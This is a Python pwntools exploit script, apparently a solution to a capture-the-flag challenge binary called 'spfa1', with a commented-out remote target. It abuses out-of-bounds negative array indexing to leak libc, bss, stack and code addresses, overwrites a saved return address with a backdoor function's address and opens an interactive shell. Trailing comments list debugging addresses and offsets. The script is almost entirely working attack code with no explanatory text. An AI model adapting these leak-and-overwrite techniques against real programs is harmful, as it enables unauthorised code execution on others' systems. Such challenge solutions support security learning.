#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']


# p = remote('chuj.top', '48092')
p = process('./spfa1')
elf = ELF('./spfa1')
libc = ELF("./libc-2.31.so")

def debug():
    gdb.attach(p)
    pause()

def init(n, m):
    p.recvuntil('nodes?\n>> ')
    p.sendline(str(n))
    p.recvuntil('edges?\n>> ')
    p.sendline(str(m))
    p.recvuntil('format\n')

def add(a,b,w):
    p.sendline(str(a))
    p.sendline(str(b))
    p.sendline(str(w))

p.recvuntil('datas?\n>> ')
p.sendline('5')

# 1 leak_libc
init(2,1)
add(0,1,1)

p.recvuntil('which node?\n>> ')
p.sendline('5')

p.recvuntil('to ?\n>> ')
# debug()
p.sendline('-2272')

p.recvuntil('is ')
stdout_addr = int(p.recvuntil('\n',drop = 'True'))
log.success('stdout_addr: ' + hex(stdout_addr))
libc.address = stdout_addr - 0x1EC6A0
log.success('libc.address: ' + hex(libc.address))

# 2 leak_bss_addr
init(2,1)
add(0,1,1)

p.recvuntil('which node?\n>> ')
p.sendline('5')

p.recvuntil('to ?\n>> ')
# debug()
#  - environ_addr
p.sendline('-2275')

p.recvuntil('is ')
bss_dist_addr = int(p.recvuntil('\n',drop = 'True')) + 0x4718
log.success('bss_dist_addr: ' + hex(bss_dist_addr))
environ_addr = libc.sym['_environ']
log.success('environ_addr: ' + hex(environ_addr))

# 3 leak_stack_addr
init(2,1)
add(0,1,1)

p.recvuntil('which node?\n>> ')
p.sendline('5')

p.recvuntil('to ?\n>> ')
# debug()
#  - environ_addr
index = (environ_addr-bss_dist_addr)//8
p.sendline(str(index))

p.recvuntil('is ')
stack_addr = int(p.recvuntil('\n',drop = 'True'))
log.success('stack_addr: ' + hex(stack_addr))
ret_addr = stack_addr - 0x100
log.success('ret_addr: ' + hex(ret_addr))

# 4 leak_code_addr
init(2,1)
add(0,1,1)

p.recvuntil('which node?\n>> ')
p.sendline('5')

p.recvuntil('to ?\n>> ')
# debug()
#  - environ_addr
index = -2368
p.sendline(str(index))

p.recvuntil('is ')
code_addr = int(p.recvuntil('\n',drop = 'True'))
log.success('code_addr: ' + hex(code_addr))
backdoor_addr = code_addr + 0x385 + 0x5
log.success('backdoor_addr: ' + hex(backdoor_addr))


# 5 ret->backdoor
init(2,1)
index = (ret_addr-bss_dist_addr)//8
add(5,index,backdoor_addr)

p.recvuntil('which node?\n>> ')
# debug()
p.sendline('5')

p.recvuntil('to ?\n>> ')
debug()
p.sendline('1')

p.interactive()




# libc 0x7ffff7bc9000
# stdout 0x7ffff7db56a0
# stdout - 0x1EC6A0 = libc

# 0xB720
# 0x7020
# 0x4700
# index = -2272

# dist = 0x555e69073720
# en 0x7fa1f2c8e2e0
# 0x2a4389c1abc0
# index = 5808695293304

# 0x7ffc19a6a3c8
# ret 0x7ffc19a6a2c8
# ret = 0x7ffc19a6a3c8 - 0x100


# 0x5582f194b8c9
# 0x5582f194b6a5

# 0xa07b
